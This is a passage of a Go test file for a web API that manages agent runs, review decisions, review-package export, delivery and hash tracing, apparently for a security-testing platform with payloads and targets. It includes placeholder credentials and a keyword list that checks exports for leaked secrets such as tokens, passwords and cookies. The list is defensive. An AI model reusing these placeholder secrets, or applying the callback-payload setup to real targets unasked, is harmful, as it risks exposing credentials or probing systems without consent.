			t.Fatalf("expected 404, got %d body=%s", w.Code, w.Body.String())
		}
	})

	t.Run("invalid decision 400", func(t *testing.T) {
		body := strings.NewReader(`{"decision":"invalid_decision","reason":"test reason"}`)
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/review-decision", body)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected 400, got %d body=%s", w.Code, w.Body.String())
		}
	})

	t.Run("reason too long 400", func(t *testing.T) {
		longReason := strings.Repeat("a", 501)
		body := strings.NewReader(fmt.Sprintf(`{"decision":"accepted","reason":"%s"}`, longReason))
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/review-decision", body)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected 400, got %d body=%s", w.Code, w.Body.String())
		}
	})
}

func TestV2ExportReviewPackage(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create web server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync required tables
	if err := server.orm.Sync2(new(v2models.AuditLog)); err != nil {
		t.Fatalf("Failed to sync audit logs table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Case)); err != nil {
		t.Fatalf("Failed to sync cases table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Payload)); err != nil {
		t.Fatalf("Failed to sync payloads table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentRun)); err != nil {
		t.Fatalf("Failed to sync agent runs table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentOperation)); err != nil {
		t.Fatalf("Failed to sync agent operations table: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	// Create test user
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Login to get token
	loginBody := `{"username":"testuser","password":"password"}`
	loginHTTPReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(loginBody))
	loginHTTPReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginHTTPReq)

	var loginResp struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to parse login response: %v, body=%s", err, loginW.Body.String())
	}
	if loginResp.Code != 0 {
		t.Fatalf("Login failed: %s", loginResp.Message)
	}
	token := loginResp.Data.Token
	userID := user.Id

	// Extract seed from JWT token and set in cache
	seedKey := fmt.Sprintf("%v.seed", userID)
	userKey := fmt.Sprintf("%v.user", userID)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}
	store.Set(userKey, user, cache.NoExpiration)

	// Create test case
	caseID := "case-export-1"
	caseItem := &v2models.Case{
		ID:        caseID,
		Title:     "Test Case",
		Status:    "active",
		CreatedBy: fmt.Sprintf("%d", userID),
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
	}
	if _, err := server.orm.Insert(caseItem); err != nil {
		t.Fatalf("Failed to create test case: %v", err)
	}

	// Create test payload
	payloadID := "payload-export-1"
	payload := &v2models.Payload{
		ID:               payloadID,
		CaseID:           caseID,
		Token:            "test-token",
		TemplateRendered: "http://{{.Token}}.example.com",
		CreatedAt:        time.Now(),
		UpdatedAt:        time.Now(),
	}
	if _, err := server.orm.Insert(payload); err != nil {
		t.Fatalf("Failed to create test payload: %v", err)
	}

	agentRunID := "agent-run-export-1"
	agentRun := &v2models.AgentRun{
		ID:         agentRunID,
		AgentID:    "agent-1",
		OperatorID: fmt.Sprintf("%d", userID),
		CaseID:     caseID,
		PayloadID:  payloadID,
		Target:     "https://target.example",
		Title:      "Export target",
		Status:     "completed",
		CreatedAt:  time.Now(),
		UpdatedAt:  time.Now(),
	}
	if _, err := server.orm.Insert(agentRun); err != nil {
		t.Fatalf("insert agent run: %v", err)
	}

	// Test successful JSON export
	body := strings.NewReader(`{"format":"json","review_packet_id":"agent-run-export-1","include_audit":true}`)
	req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/review-export", body)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
	}

	var resp struct {
		Code int `json:"code"`
		Data struct {
			AgentRunID  string                 `json:"agent_run_id"`
			Format      string                 `json:"format"`
			OperationID string                 `json:"operation_id"`
			AuditRefID  string                 `json:"audit_ref_id"`
			Package     map[string]interface{} `json:"package"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0")
	}
	if resp.Data.OperationID == "" {
		t.Fatalf("expected operation id")
	}
	if resp.Data.AuditRefID == "" {
		t.Fatalf("expected audit ref id")
	}
	if resp.Data.Format != "json" {
		t.Fatalf("expected format json, got %s", resp.Data.Format)
	}
	// Check for sensitive field leaks
	responseBody := w.Body.String()
	sensitiveKeywords := []string{
		"Authorization",
		"api_key",
		"apikey",
		"api-key",
		"token",
		"secret",
		"password",
		"cookie",
		"header",
		"private_key",
		"private-key",
		"credentials",
	}
	for _, keyword := range sensitiveKeywords {
		if strings.Contains(responseBody, keyword) {
			t.Fatalf("response leaks sensitive data: %s", keyword)
		}
	}

	// Verify operation was created
	var operation v2models.AgentOperation
	_, err = server.orm.Where("agent_run_i_d = ?", agentRunID).Desc("created_at").Get(&operation)
	if err != nil {
		t.Fatalf("failed to query operation: %v", err)
	}
	if operation.Action != "review_export.json" {
		t.Errorf("expected action review_export.json, got %s", operation.Action)
	}

	// Verify audit log was created
	var audit v2models.AuditLog
	_, err = server.orm.Where("resource_type = ? AND resource_id = ? AND action = ?", "agent_run", agentRunID, "agent_run.review_exported").Desc("timestamp").Get(&audit)
	if err != nil {
		t.Fatalf("failed to query audit log: %v", err)
	}
	if audit.Action != "agent_run.review_exported" {
		t.Errorf("expected action agent_run.review_exported, got %s", audit.Action)
	}

	// Test successful Markdown export
	body = strings.NewReader(`{"format":"markdown","review_packet_id":"agent-run-export-1"}`)
	req = httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/review-export", body)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
	}

	var mdResp struct {
		Code int `json:"code"`
		Data struct {
			AgentRunID string `json:"agent_run_id"`
			Format     string `json:"format"`
			Content    string `json:"content"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &mdResp); err != nil {
		t.Fatalf("parse response: %v", err)
	}
	if mdResp.Code != 0 {
		t.Fatalf("expected code 0")
	}
	if mdResp.Data.Format != "markdown" {
		t.Fatalf("expected format markdown, got %s", mdResp.Data.Format)
	}
	if mdResp.Data.Content == "" {
		t.Fatalf("expected markdown content")
	}
	// Check for sensitive field leaks in markdown response
	mdResponseBody := w.Body.String()
	for _, keyword := range sensitiveKeywords {
		if strings.Contains(mdResponseBody, keyword) {
			t.Fatalf("markdown response leaks sensitive data: %s", keyword)
		}
	}

	// Test error cases
	t.Run("unauthenticated 401", func(t *testing.T) {
		body := strings.NewReader(`{"format":"json"}`)
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/review-export", body)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusUnauthorized {
			t.Fatalf("expected 401, got %d body=%s", w.Code, w.Body.String())
		}
	})

	t.Run("unknown agent run 404", func(t *testing.T) {
		body := strings.NewReader(`{"format":"json"}`)
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/unknown-run/review-export", body)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusNotFound {
			t.Fatalf("expected 404, got %d body=%s", w.Code, w.Body.String())
		}
	})

	t.Run("invalid format 400", func(t *testing.T) {
		body := strings.NewReader(`{"format":"invalid_format"}`)
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/review-export", body)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected 400, got %d body=%s", w.Code, w.Body.String())
		}
	})

	t.Run("invalid review_packet_id 400", func(t *testing.T) {
		body := strings.NewReader(`{"format":"json","review_packet_id":"invalid-packet-id"}`)
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/review-export", body)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected 400, got %d body=%s", w.Code, w.Body.String())
		}
	})
}

func TestV2ListReviewQueue(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync tables
	if err := server.orm.Sync2(new(v2models.Case)); err != nil {
		t.Fatalf("Failed to sync Case table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Payload)); err != nil {
		t.Fatalf("Failed to sync Payload table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentRun)); err != nil {
		t.Fatalf("Failed to sync AgentRun table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentOperation)); err != nil {
		t.Fatalf("Failed to sync AgentOperation table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AuditLog)); err != nil {
		t.Fatalf("Failed to sync AuditLog table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT token and set in cache
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, 3600*time.Second)
					store.Set(userKey, user, 3600*time.Second)
				}
			}
		}
	}

	// Test unauthenticated
	t.Run("unauthenticated", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/review-queue", nil)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusUnauthorized {
			t.Errorf("Expected 401, got %d", w.Code)
		}
	})

	// Test authenticated request
	t.Run("authenticated", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/review-queue", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200, got %d: %s", w.Code, w.Body.String())
		}

		var resp struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
			Data    struct {
				Items   []interface{} `json:"items"`
				Summary struct {
					Total           int `json:"total"`
					NotReviewed     int `json:"not_reviewed"`
					Reviewed        int `json:"reviewed"`
					FollowupCreated int `json:"followup_created"`
					NeedsAttention  int `json:"needs_attention"`
				} `json:"summary"`
			} `json:"data"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("Failed to unmarshal response: %v", err)
		}

		if resp.Code != 0 {
			t.Errorf("Expected code 0, got %d", resp.Code)
		}
	})
}

func TestV2ListFollowupHistory(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync tables
	if err := server.orm.Sync2(new(v2models.Case)); err != nil {
		t.Fatalf("Failed to sync Case table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Payload)); err != nil {
		t.Fatalf("Failed to sync Payload table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentRun)); err != nil {
		t.Fatalf("Failed to sync AgentRun table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentOperation)); err != nil {
		t.Fatalf("Failed to sync AgentOperation table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AuditLog)); err != nil {
		t.Fatalf("Failed to sync AuditLog table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT token and set in cache
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, 3600*time.Second)
					store.Set(userKey, user, 3600*time.Second)
				}
			}
		}
	}

	// Test unauthenticated
	t.Run("unauthenticated", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/test-run/followups", nil)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusUnauthorized {
			t.Errorf("Expected 401, got %d", w.Code)
		}
	})

	// Test authenticated request
	t.Run("authenticated", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/test-run/followups", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200, got %d: %s", w.Code, w.Body.String())
		}

		var resp struct {
			Code    int           `json:"code"`
			Message string        `json:"message"`
			Data    []interface{} `json:"data"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("Failed to unmarshal response: %v", err)
		}

		if resp.Code != 0 {
			t.Errorf("Expected code 0, got %d", resp.Code)
		}
	})
}

// TestV2TraceReviewPackage tests the package trace API
func TestV2TraceReviewPackage(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}
	defer server.orm.Close()

	// Sync required v2 tables
	if err := server.orm.Sync2(new(v2models.AgentRun)); err != nil {
		t.Fatalf("Failed to sync agent runs table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentOperation)); err != nil {
		t.Fatalf("Failed to sync agent operations table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AuditLog)); err != nil {
		t.Fatalf("Failed to sync audit logs table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Create router and register routes
	r := gin.New()
	server.registerV2API(r)

	// Login to get token
	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	if loginW.Code != http.StatusOK {
		t.Fatalf("Login failed: %d - %s", loginW.Code, loginW.Body.String())
	}

	var loginResp struct {
		Code int `json:"code"`
		Data struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT and set user in cache
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		t.Fatal("Invalid JWT token format")
	}
	decoded, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		t.Fatalf("Failed to decode JWT payload: %v", err)
	}
	var claims map[string]interface{}
	if err := json.Unmarshal(decoded, &claims); err != nil {
		t.Fatalf("Failed to unmarshal JWT claims: %v", err)
	}
	seedValue := claims["seed"]
	var seedStr string
	switch v := seedValue.(type) {
	case float64:
		seedStr = fmt.Sprintf("%.0f", v)
	case string:
		seedStr = v
	default:
		t.Fatalf("Unexpected seed type: %T, value: %v", seedValue, seedValue)
	}
	seedKey := fmt.Sprintf("%v.seed", user.Id)
	store.Set(seedKey, seedStr, 3600*time.Second)
	userKey := fmt.Sprintf("%v", user.Id)
	store.Set(userKey, user, 3600*time.Second)

	// Create test agent run
	agentRunID := "agent-run-trace-1"
	agentRun := &v2models.AgentRun{
		ID:         agentRunID,
		AgentID:    "agent-123",
		OperatorID: "testuser",
		Title:      "Test Agent Run for Trace",
		Status:     v2models.AgentRunStatusCompleted,
		StartedAt:  &[]time.Time{time.Now()}[0],
		EndedAt:    &[]time.Time{time.Now()}[0],
		CreatedAt:  time.Now(),
		UpdatedAt:  time.Now(),
	}
	if _, err := server.orm.Insert(agentRun); err != nil {
		t.Fatalf("insert agent run: %v", err)
	}

	// Create export operation with package_hash
	exportOpID := "op-export-trace-1"
	exportResult := map[string]interface{}{
		"package_hash":     "abc123def4567890123456789012345678901234567890123456789012345678",
		"audit_ref_id":     "audit-export-trace-1",
		"review_packet_id": "packet-1",
	}
	exportResultJSON, _ := json.Marshal(exportResult)
	exportOp := &v2models.AgentOperation{
		ID:         exportOpID,
		AgentRunID: agentRunID,
		AgentID:    "agent-123",
		Action:     "review_export.json",
		Result:     string(exportResultJSON),
		StartedAt:  time.Now(),
		CreatedAt:  time.Now(),
	}
	if _, err := server.orm.Insert(exportOp); err != nil {
		t.Fatalf("insert export operation: %v", err)
	}

	// Create delivery operation with package_hash
	deliveryOpID := "op-delivery-trace-1"
	deliveryRequest := map[string]interface{}{
		"webhook_url": "https://hooks.example.com/webhook",
		"headers": map[string]string{
			"Authorization": "Bearer secret-token",
			"X-API-Key":     "api-key-123",
		},
	}
	deliveryRequestJSON, _ := json.Marshal(deliveryRequest)
	deliveryResult := map[string]interface{}{
		"package_hash":        "abc123def4567890123456789012345678901234567890123456789012345678",
		"result":              "delivered",
		"status_code":         200,
		"delivery_id":         "delivery-1",
		"export_operation_id": exportOpID,
		"audit_ref_id":        "audit-delivery-trace-1",
		"delivered_at":        time.Now().Format(time.RFC3339),
	}
	deliveryResultJSON, _ := json.Marshal(deliveryResult)
	deliveryOp := &v2models.AgentOperation{
		ID:         deliveryOpID,
		AgentRunID: agentRunID,
		AgentID:    "agent-123",
		Action:     "review_delivery.webhook",
		Request:    string(deliveryRequestJSON),
		Result:     string(deliveryResultJSON),
		StartedAt:  time.Now(),
		CreatedAt:  time.Now(),
	}
	if _, err := server.orm.Insert(deliveryOp); err != nil {
		t.Fatalf("insert delivery operation: %v", err)
	}

	// Create failed delivery operation for testing failed count
	failedDeliveryOpID := "op-delivery-failed-1"
	failedDeliveryResult := map[string]interface{}{
		"package_hash":        "abc123def4567890123456789012345678901234567890123456789012345678",
		"result":              "failed",
		"status_code":         500,
		"delivery_id":         "delivery-failed-1",
		"export_operation_id": exportOpID,
		"audit_ref_id":        "audit-delivery-failed-1",
		"error":               "Internal server error",
	}
	failedDeliveryResultJSON, _ := json.Marshal(failedDeliveryResult)
	failedDeliveryOp := &v2models.AgentOperation{
		ID:         failedDeliveryOpID,
		AgentRunID: agentRunID,
		AgentID:    "agent-123",
		Action:     "review_delivery.webhook",
		Result:     string(failedDeliveryResultJSON),
		StartedAt:  time.Now(),
		CreatedAt:  time.Now(),
	}
	if _, err := server.orm.Insert(failedDeliveryOp); err != nil {
		t.Fatalf("insert failed delivery operation: %v", err)
	}

	// Create timeout delivery operation for testing timeout count
	timeoutDeliveryOpID := "op-delivery-timeout-1"
	timeoutDeliveryResult := map[string]interface{}{
		"package_hash":        "abc123def4567890123456789012345678901234567890123456789012345678",
		"result":              "timeout",
		"status_code":         0,
		"delivery_id":         "delivery-timeout-1",
		"export_operation_id": exportOpID,
		"audit_ref_id":        "audit-delivery-timeout-1",
		"error":               "Request timeout",
	}
	timeoutDeliveryResultJSON, _ := json.Marshal(timeoutDeliveryResult)
	timeoutDeliveryOp := &v2models.AgentOperation{
		ID:         timeoutDeliveryOpID,
		AgentRunID: agentRunID,
		AgentID:    "agent-123",
		Action:     "review_delivery.webhook",
		Result:     string(timeoutDeliveryResultJSON),
		StartedAt:  time.Now(),
		CreatedAt:  time.Now(),
	}
	if _, err := server.orm.Insert(timeoutDeliveryOp); err != nil {
		t.Fatalf("insert timeout delivery operation: %v", err)
	}

	// Create audit log with package_hash
	userIDStr := fmt.Sprintf("%d", user.Id)
	auditDetailsMap := map[string]interface{}{"package_hash": "abc123def4567890123456789012345678901234567890123456789012345678"}
	auditLog := &v2models.AuditLog{
		ID:           "audit-export-trace-1",
		UserID:       &userIDStr,
		Action:       "agent_run.review_exported",
		ResourceType: "agent_run",
		ResourceID:   &agentRunID,
		Result:       "success",
		Details:      v2models.AuditDetails(auditDetailsMap),
		Timestamp:    time.Now(),
		CreatedAt:    time.Now(),
	}
	if _, err := server.orm.Insert(auditLog); err != nil {
		t.Fatalf("insert audit log: %v", err)
	}

	validHash := "abc123def4567890123456789012345678901234567890123456789012345678"

	// Test unauthenticated
	t.Run("unauthenticated", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/review-package-trace?package_hash="+validHash, nil)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusUnauthorized {
			t.Errorf("Expected 401, got %d", w.Code)
		}
	})

	// Test missing package_hash parameter
	t.Run("missing package_hash", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/review-package-trace", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("Expected 400, got %d", w.Code)
		}

		var resp struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("Failed to unmarshal response: %v", err)
		}

		if resp.Message != "package_hash is required" {
			t.Errorf("Expected 'package_hash is required', got '%s'", resp.Message)
		}
	})

	// Test invalid package_hash format
	t.Run("invalid package_hash format", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/review-package-trace?package_hash=invalid", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("Expected 400, got %d", w.Code)
		}

		var resp struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("Failed to unmarshal response: %v", err)
		}

		if !strings.Contains(resp.Message, "invalid package_hash") {
			t.Errorf("Expected 'invalid package_hash' in message, got '%s'", resp.Message)
		}
	})

	// Test empty result (no matching records)
	t.Run("empty result", func(t *testing.T) {
		emptyHash := "0000000000000000000000000000000000000000000000000000000000000000"
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/review-package-trace?package_hash="+emptyHash, nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200, got %d", w.Code)
		}

		var resp struct {
			Code int                                         `json:"code"`
			Data v2models.AgentRunReviewPackageTraceResponse `json:"data"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("Failed to unmarshal response: %v", err)
		}

		if resp.Code != 0 {
			t.Errorf("Expected code 0, got %d", resp.Code)
		}

		// Verify empty summary
		if resp.Data.Summary.AgentRunCount != 0 {
			t.Errorf("Expected agent_run_count 0, got %d", resp.Data.Summary.AgentRunCount)
		}
		if resp.Data.Summary.ExportCount != 0 {
			t.Errorf("Expected export_count 0, got %d", resp.Data.Summary.ExportCount)
		}
		if len(resp.Data.AgentRuns) != 0 {
			t.Errorf("Expected empty agent_runs, got %d", len(resp.Data.AgentRuns))
		}
	})

	// Test successful trace with export, delivery, and audit
	t.Run("successful trace", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/review-package-trace?package_hash="+validHash, nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200, got %d: %s", w.Code, w.Body.String())
		}

		var resp struct {
			Code int                                         `json:"code"`
			Data v2models.AgentRunReviewPackageTraceResponse `json:"data"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("Failed to unmarshal response: %v", err)
		}

		if resp.Code != 0 {
			t.Errorf("Expected code 0, got %d", resp.Code)
		}

		// Verify package_hash in response
		if resp.Data.PackageHash != validHash {
			t.Errorf("Expected package_hash %s, got %s", validHash, resp.Data.PackageHash)
		}

		// Verify summary counts
		if resp.Data.Summary.AgentRunCount != 1 {
			t.Errorf("Expected agent_run_count 1, got %d", resp.Data.Summary.AgentRunCount)
		}
		if resp.Data.Summary.ExportCount != 1 {
			t.Errorf("Expected export_count 1, got %d", resp.Data.Summary.ExportCount)
		}
		if resp.Data.Summary.DeliveryCount != 3 {
